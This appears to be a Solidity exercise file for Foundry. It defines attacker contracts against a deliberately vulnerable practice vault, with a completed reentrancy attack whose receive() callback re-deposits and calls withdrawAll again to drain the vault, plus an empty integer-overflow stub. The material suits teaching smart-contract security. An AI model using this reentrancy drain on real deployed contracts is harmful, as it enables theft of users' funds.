// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../src/SafeVault.sol";
import "../src/Attacker.sol";

interface ISafeVault {
    function balance(address) external view returns (uint256);
    function withdrawAll(address) external;
    function deposit() external payable;
    function transfer(address, uint256) external;
}

contract ReentrancyAttacker {
    // receive: callback function for empty data with any eth value
    receive() external payable {
        // Write your own code.
        // You have 10 deposit balance.
        // Be careful that the target (vulnerable) contract has 10_020 ethereum total.
        if (address(this).balance >= 5000) {
            return;
        }

        ISafeVault sv = ISafeVault(msg.sender);
        // sv.deposit{value: 5000}(); -> Since actual balance of `this`, which is 10 eth, is smaller than 5000, the deposit call results in EvmError: OutOfFund.
        
        // Easy: Each single withdrawAll() call increases attacker's balance by 10.
        // Hard: Each single withdrawAll() call increases attacker's balance by 10, 20, 40, 80, ...
        sv.deposit{value: address(this).balance}();
        sv.withdrawAll(address(this));
        return;
    }
}

contract IntegerOverUnderflowAttacker {
    receive() external payable {}

    function integerOverUnderflowAttackHandler(address vault) external {
        // Write your own code.
        // You have 10 deposit balance.
        // Be careful that the target (vulnerable) contract has 10_020 ethereum total.
    }
}
